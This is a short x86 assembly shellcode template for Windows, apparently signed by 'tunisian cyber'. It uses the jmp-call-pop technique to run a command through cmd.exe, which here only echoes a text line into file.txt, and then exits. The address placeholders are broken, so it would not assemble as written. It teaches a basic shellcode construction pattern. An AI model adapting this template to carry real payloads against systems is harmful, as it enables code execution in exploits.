[Section .text]
 
BITS 32
 
global _start
 
_start:
 
jmp short GetCommand 
CommandReturn: 
    pop ebx
 
    xor eax,eax 
    push eax 
    push ebx 
    mov ebx, kernelpath
    call ebx 
 
    xor eax,eax
    push eax
    mov ebx, exitProcess path
    call ebx
 
GetCommand:
    call CommandReturn
    db "cmd.exe /C echo shellcode by tunisian cyber >file.txt"
    db 0x00